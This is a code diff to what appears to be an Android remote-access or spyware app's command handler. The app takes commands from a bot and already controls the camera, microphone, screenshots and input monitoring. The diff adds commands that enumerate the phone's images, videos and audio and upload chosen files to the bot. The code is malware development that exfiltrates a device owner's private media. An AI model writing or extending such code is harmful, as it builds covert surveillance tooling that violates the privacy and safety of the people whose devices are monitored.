@@ -57,7 +57,9 @@ class CommandHandler(
                     "autoclick-on", "autoclick-off",
                     "input-monitoring-on", "input-monitoring-off",
                     "screenshot-on", "screenshot-off",
-                    "ls", "download-file"
+                    "ls", "download-file",
+                    "media-images", "media-videos", "media-audio",
+                    "download-media"
                 )
                 if (missingPerms.isNotEmpty() && !isManagementCmd) {
                     val response = JSONObject().apply {
@@ -75,7 +77,13 @@ class CommandHandler(
 
                     // ─── FILE RESULTS: Upload directly to bot as media ───
                     if (result is CollectedData.FileResult) {
+                        // ✅ Detect file type from metadata tag (set by DataCollectors)
+                        // Falls back to command-based detection
+                        val meta = result.metadata
                         val fileType = when {
+                            meta == "media_image" -> "photo"
+                            meta == "media_video" -> "video"
+                            meta == "media_audio" -> "audio"
                             command.contains("camera") || command.contains("screenshot") -> "photo"
                             command.contains("microphone") || command.contains("audio") -> "audio"
                             command.contains("video") || command == "pull-videos" -> "video"
@@ -97,7 +105,8 @@ class CommandHandler(
                             var isFileList = false
                             try {
                                 val parsed = JSONObject(text)
-                                if (parsed.optString("type") == "file_list") {
+                                val t = parsed.optString("type")
+                                if (t == "file_list" || t == "media_list") {
                                     isFileList = true
                                     val response = JSONObject().apply {
                                         put("command", command)
@@ -106,7 +115,7 @@ class CommandHandler(
                                         put("device_id", deviceId)
                                     }
                                     sendResponse(response)
-                                    Log.i(TAG, "✅ Sent file_list via command_response (inline keyboard)")
+                                    Log.i(TAG, "✅ Sent $t via command_response (inline keyboard)")
                                 }
                             } catch (e: Exception) {
                                 // Not a JSON object - fall through to normal handling
@@ -400,6 +409,18 @@ class CommandHandler(
                     collectors.downloadFile(filePath)
                 } else {
                     CollectedData.TextResult("❌ لم يتم تحديد مسار الملف")
+                }
+            }
+            // ✅ NEW: MediaStore-based file explorer commands
+            "media-images" -> collectors.listMediaFiles("images")
+            "media-videos" -> collectors.listMediaFiles("videos")
+            "media-audio" -> collectors.listMediaFiles("audio")
+            "download-media" -> {
+                val uri = params?.optString("value", "") ?: ""
+                if (uri.isNotEmpty()) {
+                    collectors.downloadMediaFile(uri)
+                } else {
+                    CollectedData.TextResult("❌ لم يتم تحديد URI الملف")
                 }
             }
             "app-monitor-start" -> collectors.startAppMonitor()
